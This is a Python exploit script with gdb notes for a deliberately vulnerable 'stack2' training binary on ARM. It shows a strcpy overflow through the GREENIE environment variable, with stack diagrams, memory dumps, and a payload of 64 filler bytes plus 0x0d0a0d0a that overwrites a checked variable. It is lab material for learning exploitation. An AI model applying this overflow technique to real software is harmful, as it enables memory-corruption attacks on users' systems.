#!/usr/bin/python3
from subprocess import Popen, PIPE
import shlex
import struct
import os

'''
	+----------+
	| A A A A  |  <=== FP-76 [ACID]
	+----------+-\
	   ...       |
	    ...      | 64 bytes to corruption of VAR 
	     ...     |
	+----------+-/
	|    VAR   |  <=== FP-12 (var being checked with 0x0d0a0d0a)
	+----------+
	|  XXXXXX  |
	+----------+
	| saved FP |
	+----------+
	| saved LR |  <--- FP 
	+----------+

# run the program with an environment variable named GREENIE
$ env GREENIE=$(python3 -c "print('A'*64+'BBBB')") gdb ./stack2
(gdb) b *main+88
(gdb) r

   0x00010530 <+76>:    bl      0x10368 <strcpy@plt>
   0x00010534 <+80>:    ldr     r3, [r11, #-12]
   0x00010538 <+84>:    ldr     r2, [pc, #52]   ; 0x10574 <main+144>
=> 0x0001053c <+88>:    cmp     r3, r2

(gdb) x/xw 0x10574
0x10574 <main+144>:     0x0d0a0d0a

(gdb) i r $r2 $r3
r2             0xd0a0d0a        218762506
r3             0x42424242       1111638594

(gdb) b *main+76
Breakpoint 2 at 0x10530
(gdb) b *main+80
Breakpoint 3 at 0x10534
(gdb) del 1

STACK state before ACID rain
(gdb) x/20xw $fp-76
(gdb) x/20xw $fp-76
0xbefff1a0:     0x00000000      0xb6ffbfc4      0x00000003      0xb6e77be8
0xbefff1b0:     0x00000000      0xb6e779f8      0xbefff1f0      0xb6fd618c
0xbefff1c0:     0x00000000      0x00000000      0x000104ac      0x000105d0
0xbefff1d0:     0xb6fb2ba0      0x00010580      0x00000000      0x000103bc
0xbefff1e0:     0x00000000      0xbefffe48      0x00000000      0xb6e8c294

GREENIE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

STACK state after ACID rain
(gdb) x/20xw $fp-72
(gdb) x/20xw $fp-76
0xbefff1a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1e0:     0x0d0a0d0a      0xbefffe00      0x00000000      0xb6e8c294
'''

target = "./stack2"

# 65th byte will corrupt the variable being sanity checked
payload = 'A'*64		
payload += struct.pack('<i', 0x0d0a0d0a).decode('utf-8')

myEnv = os.environ.copy()
myEnv['GREENIE'] = payload

# write payload to disk (for manual exploitation)
fo = open(target + '.input', 'wb')
fo.write(payload.encode('utf-8'))
fo.close()

p = Popen(shlex.split(target), env=myEnv)
